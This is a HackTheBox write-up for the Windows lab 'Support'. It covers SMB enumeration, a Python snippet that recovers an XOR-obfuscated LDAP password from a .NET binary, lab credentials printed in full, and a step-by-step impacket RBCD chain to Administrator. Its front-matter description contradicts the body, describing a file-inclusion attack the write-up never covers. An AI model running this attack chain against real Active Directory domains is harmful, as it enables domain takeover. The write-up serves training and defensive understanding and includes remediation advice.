---
title: HTB · Support
slug: htb-support
date: 2026-07-25
image: support
platform: HackTheBox
os: Windows
difficulty: Easy
points: 450
tags: [hackthebox, windows, retired, reverse-engineering, smbclient, active-directory, crackmapexec, ldapsearch, evil-winrm, dotnet, ldap-injection, bloodhound, dnspy]
description: This lab focuses on how a File Inclusion vulnerability on a webpage being served on a Windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server.
featured: true
---

# Reconnaissance

## Staged Nmap Scanning
````bash
nmap -p- --min-rate 10000 10.129.230.181
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.230.181
````
### Initial Scan Results
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 07:40:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Hosts File
This is clearly a Windows host, and likely a Domain Controller based on the presence of Kerberos (88), DNS (53), LDAP (389, 3268 and 3269), etc. `nmap` doesn’t give much detail about beyond that. It does note the hostname `DC` and the domain `support.htb`, so I’ll add both to my `/etc/hosts` file:
```bash
echo "10.129.230.181 dc.support.htb" | sudo tee -a /etc/hosts
echo "10.129.230.181 support.htb" | sudo tee -a /etc/hosts
```
---
## SMB - TCP 445
**General Information**
```bash
smbclient -N -L //support.htb
```

| Sharename     | Type | Comment             |
| ------------- | ---- | ------------------- |
| ADMIN$        | Disk | Remote Admin        |
| C$            | Disk | Default share       |
| IPC$          | IPC  | Remote IPC          |
| NETLOGON      | Disk | Logon server share  |
| support-tools | Disk | support staff tools |
| SYSVOL        | Disk | Logon server share  |
I can connect to `NETLOGON` and `SYSVOL`, but can’t list them:

---
### support-tools
I am able to connect to and list the `support-tools` share:
`smbclient -N //support.htb/support-tools`

```bash
smb: \> ls
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```
It looks like that everything here are just publicly available support tools, except for UserInfo.exe.zip, lets try to download it to our machine and investigate.
```bash
get UserInfo.exe.zip 
```
Let's unzip it into a directory:
```bash
unzip UserInfo.exe.zip
```
---
# Auth as ldap
## UserInfo.exe
### Run UserInfo.exe
The EXE is a 32-bit .NET executable:
```bash
> file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
I will try to run it on my Windows VM.
```powershell
PS > .\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```
All the DLLs and the `.config` file must be in the same directory, or it returns an error like this:
```powershell
PS > .\UserInfo.exe

Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly 'CommandLineParser, Version=0.7.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
   at UserInfo.Program.Main(String[] args)
   at UserInfo.Program.<Main>(String[] args)
```
If I run either `find` or `user` with `-h`, it prints help for each. For example:
```powershell
PS > .\UserInfo.exe user -h

Usage: UserInfo.exe user [options]

Options:
  -username           Username
```
Either command hangs for a bit and then returns an error on running:
```powershell
PS > .\UserInfo.exe user -username arman
[-] Exception: The server is not operational.
```
The problem is that it's looking for `support.htb`, so i'll just update `C:\Windows\System32\drivers\etc\hosts` just like on Linux, and connect my VPN in this Windows host so that I can talk to Support. Now it reports that it can’t find my username:
```powershell
PS > .\UserInfo.exe user -username arman
[-] Unable to locate arman. Please try the find command to get the user's username.
```
The `user` command requires an exact username, which I didn't know yet. The `find` command with a wildcard revealed all usernames, allowing me to then query specific users."
The `find` command accepts wildcards. By passing `-first '*'`, I retrieve all users from the directory.
```powershell
PS > .\UserInfo.exe find
[-] At least one of -first or -last is required.
PS > .\UserInfo.exe find -first '*'
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria
```
With a valid name it prints out info about the user that a support team might need:
```powershell
PS > .\UserInfo.exe user -username raven.clifton
First Name:           clifton
Last Name:            raven
Contact:              raven.clifton@support.htb
Last Password Change: 5/28/2022 3:13:53 PM
```
I could go further into the LDAP injection, but given that it’s making LDAP queries against Support, and that these queries require auth, I’ll look at the binary to locate credentials.

---
I’ll open `UserInfo.exe` in **DNSpy**.

Let's investigate `LdapQuery`.
It’s loading a password, and then connecting to LDAP with the user SUPPORT\ldap and that password.
I need to look at the `Protected.getPassword()` function.

I'll decrypt the password using Python terminal.
```python
$ python3            
Python 3.13.14 (main, Jun 10 2026, 18:10:12) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from base64 import b64decode
>>> from itertools import cycle
>>> pass_b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> enc = b64decode(pass_b64)
>>> [e^k^223 for e,k in zip(enc, cycle(key))]
[110, 118, 69, 102, 69, 75, 49, 54, 94, 49, 97, 77, 52, 36, 101, 55, 65, 99, 108, 85, 102, 56, 120, 36, 116, 82, 87, 120, 80, 87, 79, 49, 37, 108, 109, 122]
>>> bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
>>> 
```
> [!note]
> The `Protected.getPassword()` function in dnSpy revealed a simple XOR-based 
> obfuscation: the password is base64-decoded, then each byte is XORed with 
> a cycling key (`armando`) and XORed again with `223` (0xDF).

---
# Shell as support
## Bloodhound
Let's just run it for now and we will see later how we can use it.
```bash
> bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.129.230.181

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 13S
```
---
## LDAP
Ill run `ldapsearch` which will show all the items in the AD, which I can look through:
```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "*"
```

The password was found in the `info` attribute of the `support` user object:
“Ironside47pleasure40Watchful” looks like it could be a password, and given no first or last name, this looks like a shared account, so it makes sense that the password may be stored here.
info: **Ironside47pleasure40Watchful**

---
## Evil WinRM
Since my bloodhound wasn't working properly for some reason, i just used crackmapexec instead. 
```bash
nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```
> [!note]
> crackmapexec works too but it's legacy.

I’ll connect with `evil-winrm` and get a shell:
```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```
And we got the `user.txt`:

---
# Privilege Escalation

## BloodHound Analysis

After obtaining initial access as the `support` user, I performed Active Directory enumeration using **BloodHound**. The analysis revealed a critical attack path:

The `support` user is a member of the **Shared Support Accounts** group, which has **`GenericAll`** permissions on the domain controller computer object **`DC.SUPPORT.HTB`**.

### What `GenericAll` on a Computer Object Means

`GenericAll` (Full Control) on a computer object in Active Directory is one of the most powerful privileges a non-admin user can have. It grants complete control over that computer's AD object, including the ability to modify its attributes. This opens several attack vectors:

| Attack Vector | Description | Complexity |
|--------------|-------------|------------|
| **Resource-Based Constrained Delegation (RBCD)** | Configure the DC to trust a fake computer account you control, allowing you to impersonate any user (including Domain Admin) | Medium |
| **Shadow Credentials** | Add a Key Credential Link to the computer object, then request a TGT as that computer account | Medium |
| **LAPS Password Reading** | If LAPS is deployed, read the local admin password stored in the computer object's attributes | Easy |

For this machine, I pursued the **RBCD attack path** as it is the standard technique when `GenericAll` on a computer object is identified via BloodHound.

---

## The RBCD Attack Chain

### Concept

Resource-Based Constrained Delegation (RBCD) is a Windows feature that allows a computer/resource to specify which other computers are allowed to delegate (impersonate users) to it. Normally, only Domain Admins can configure this. However, with `GenericAll` on the DC computer object, **we can modify this setting ourselves**.

**The attack flow:**
1. Create a fake computer account in the domain (requires `MachineAccountQuota > 0`)
2. Configure RBCD on the DC computer object to allow our fake computer to delegate to it
3. Use our fake computer to request a service ticket impersonating the Domain Admin
4. Use that ticket to authenticate to the DC as Administrator

---

## Step 1: Verify MachineAccountQuota

Before creating a fake computer account, we need to verify that regular users are allowed to do so:

```powershell
# From the WinRM shell as support
Get-ADObject -Identity ((Get-ADRootDSE).defaultNamingContext) -Properties ms-DS-MachineAccountQuota
```

If `MachineAccountQuota` is greater than 0, we can proceed. In most domains, the default is 10.

---

## Step 2: Create a Fake Computer Account

Using `impacket-addcomputer` from our Kali attack machine:

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful'
```

**What this does:**
- Creates a new computer object `FAKE01$` in Active Directory
- Sets its password to `FakePass123!`
- This computer is now a legitimate domain member that we fully control

---

## Step 3: Configure RBCD on the DC

Now we configure the DC computer object to allow our fake computer to delegate to it:

```bash
impacket-rbcd -action write -delegate-from 'FAKE01$' -delegate-to 'DC$' -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful'
```

**What this does:**
- Modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC computer object
- Adds `FAKE01$` to the list of principals allowed to delegate to the DC
- This is the critical step that only works because we have `GenericAll` on the DC object

---

## Step 4: Request a Service Ticket as Administrator

With RBCD configured, we can now request a service ticket impersonating any user — including the Domain Admin:

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/FAKE01$:'FakePass123!'
```

**What this does:**
- Authenticates as our fake computer `FAKE01$`
- Requests a service ticket for `cifs/dc.support.htb` (the CIFS service on the DC)
- Asks to impersonate the `Administrator` user
- The DC trusts `FAKE01$` for delegation (because we configured RBCD), so it issues the ticket

This generates a file named `Administrator.ccache` — a Kerberos ticket cache for the Administrator user.

---

## Step 5: Use the Ticket to Get Admin Access

Export the ticket and use it to authenticate:

```bash
# Set the ticket cache environment variable
export KRB5CCNAME=Administrator.ccache

# Use psexec with the ticket (no password needed)
impacket-psexec -k -no-pass dc.support.htb

# Or use smbexec
impacket-smbexec -k -no-pass dc.support.htb
```

**What this does:**
- `psexec` connects to the DC using the Kerberos ticket we obtained
- The DC sees a valid ticket for `Administrator@SUPPORT.HTB` and grants access
- We receive a SYSTEM shell on the domain controller

---

## Retrieving the Root Flag

Once connected as Administrator:

```powershell
# The root flag is typically on the Administrator desktop
cd C:\Users\Administrator\Desktop
cat root.txt
```

**Flag:** `[REDACTED]`

---

## Why This Works

The root cause of this vulnerability is **excessive permissions** granted to the `Shared Support Accounts` group. In Active Directory, the principle of least privilege (PoLP) should be strictly enforced:

| Issue | Impact |
|-------|--------|
| `GenericAll` on DC computer object | Full control over the most critical server in the domain |
| Default `MachineAccountQuota` | Allows any authenticated user to create computer accounts |
| No delegation restrictions | RBCD can be configured by anyone with object control |

**The fix:** Remove `GenericAll` from `Shared Support Accounts` on the DC computer object. If the group needs to manage the DC, grant only specific, minimal permissions (e.g., `Read` and `Write` for specific attributes) rather than full control.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `BloodHound` | Identify ACL abuse paths in Active Directory |
| `impacket-addcomputer` | Create a fake computer account in the domain |
| `impacket-rbcd` | Configure Resource-Based Constrained Delegation |
| `impacket-getST` | Request a service ticket via delegation |
| `impacket-psexec` | Execute commands using the stolen Kerberos ticket |

---

## References

- [BloodHound — GitHub](https://github.com/BloodHoundAD/BloodHound)
- [Impacket — GitHub](https://github.com/fortra/impacket)
- [Resource-Based Constrained Delegation — SpectorOps](https://posts.specterops.io/resource-based-constrained-delegation-abuse-381a8c3ce97f)
- [Shadow Credentials — Elad Shamir](https://www.eladshamir.com/2021/01/shadow-credentials.html)
- [HackTheBox — Support](https://app.hackthebox.com/machines/Support)
